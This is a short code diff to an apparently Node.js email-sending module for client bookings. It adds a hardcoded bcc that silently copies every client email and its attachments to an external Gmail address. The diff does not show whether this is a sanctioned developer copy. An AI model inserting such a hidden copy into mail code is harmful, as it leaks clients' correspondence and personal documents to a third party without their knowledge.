@@ -158,7 +158,7 @@ module.exports = function (to, data, state = 'book') {
     {
       from: process.env.EMAIL_USERNAME, // sender address
       to: [client.email],
-
+      bcc: 'sigidevelopers@gmail.com',
       subject: subject,
       // Ensure attachments array has no undefined entries
       attachments: (attachment.footer || []).filter(Boolean),
